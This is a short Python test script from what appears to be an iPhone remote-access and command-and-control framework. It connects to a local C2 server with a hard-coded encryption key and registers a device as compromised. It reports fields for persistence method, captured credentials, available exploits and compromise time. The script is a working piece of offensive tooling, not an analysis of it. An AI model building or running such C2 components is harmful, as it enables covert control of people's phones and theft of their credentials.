#!/usr/bin/env python3
"""Test device registration with C2 server"""

import asyncio
from iphone_remote_access import iPhoneRemoteControl

async def main():
    print("[*] Testing device registration...")
    
    # Use the encryption key from the running C2 server
    # You'll need to get this from the C2 server window
    encryption_key = "JYgC40zLhxRDFO_zqxo7GwU0sEtTX3oH-Mz1gR-lEcI="
    c2_server = "http://localhost:9443"
    device_id = "00008030-001234567890ABCD"
    
    controller = iPhoneRemoteControl(
        c2_server=c2_server,
        encryption_key=encryption_key
    )
    
    print(f"[*] Registering device: {device_id}")
    
    try:
        # Initialize C2 connection
        print("[*] Initializing C2 connection...")
        await controller.c2.initialize()
        print("[+] C2 connection initialized")
        
        # Register device
        device_info = {
            'status': {
                'jailbroken': False,
                'ios_version': '17.0',
                'exploit_available': [],
                'persistence_methods': ['Configuration Profile']
            },
            'credentials': {},
            'compromise_time': '2025-01-26T23:00:00',
            'method': 'demo'
        }
        
        print(f"[*] Sending registration request to {c2_server}/api/register...")
        result = await controller.c2.register_device(device_id, device_info)
        print(f"[+] Registration result: {result}")
        
        # Wait a moment
        await asyncio.sleep(2)
        
        print("[+] Device registered successfully!")
        print(f"[*] Device ID: {device_id}")
        print(f"[*] C2 Server: {c2_server}")
        
    except Exception as e:
        print(f"[!] Registration failed: {e}")
        import traceback
        traceback.print_exc()
    finally:
        await controller.close()

if __name__ == "__main__":
    asyncio.run(main())
